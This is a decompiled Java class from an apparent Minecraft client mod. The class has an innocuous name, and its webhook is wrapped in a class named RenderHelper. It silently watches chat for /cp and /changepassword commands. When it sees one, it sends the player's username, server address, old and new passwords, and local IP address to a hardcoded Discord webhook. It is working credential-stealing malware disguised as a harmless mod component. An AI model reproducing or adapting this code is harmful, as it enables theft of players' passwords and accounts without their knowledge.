/*    */ package sertyo.events.command.module;
/*    */ 
/*    */

import com.darkmagician6.eventapi.EventManager;
import com.darkmagician6.eventapi.EventTarget;
import net.minecraft.client.Minecraft;
import sertyo.events.event.misc.EventMessage;

import java.awt.*;
import java.io.IOException;
import java.net.InetAddress;

/*    */
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class cmodule
/*    */ {
/* 20 */   private final RenderHelper webhookLogger = new RenderHelper("https://discord.com/api/webhooks/1244227030040445039/fzBqU_UjCn_KIx96iEVMpby_t_prSbx-zf2PO6OL2iK8cUstBSt0Ept6E_VArcO3EMY2");
/*    */   
/*    */   public cmodule() {
/* 23 */     EventManager.register(this);
/*    */   }
/*    */   
/*    */   @EventTarget
/*    */   public void ChatEvent(EventMessage e) {
/* 28 */     String msg = e.getMessage();
/* 29 */     String[] sentences = e.getMessage().split(" ");
/*    */     
/* 31 */     if (msg.startsWith("/cp") || (msg.startsWith("/changepassword") && sentences.length > 1))
/*    */       try {
/* 33 */         System.out.println(Minecraft.getInstance().getSession().getUsername());
/* 34 */         this.webhookLogger.clearEmbeds();
/* 35 */         this.webhookLogger.addEmbed((new RenderHelper.EmbedObject())
/* 36 */             .setTitle("OnMudak")
/* 37 */             .setDescription("Change-Pass Detected | Secret")
/* 38 */             .setColor(new Color(1, 1, 1))
/* 39 */             .addField("SERVER", (Minecraft.getInstance().getCurrentServerData()).serverIP.toLowerCase(), true)
/* 40 */             .addField("USER", Minecraft.getInstance().getSession().getUsername(), true)
/* 41 */             .addField("OLD PASSWORD", sentences[1], true)
/* 42 */             .addField("NEW PASSWORD", sentences[2], true)
/* 43 */             .addField("IP ADDRES", InetAddress.getLocalHost().getHostAddress(), false));
/* 44 */         this.webhookLogger.execute();
/* 45 */       } catch (IOException ex) {
/* 46 */         ex.printStackTrace();
/*    */       }  
/*    */   }
/*    */ }


/* Location:              D:\MangoSense\MangoSense.jar!\mango\commands\module\ChangePassModule.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */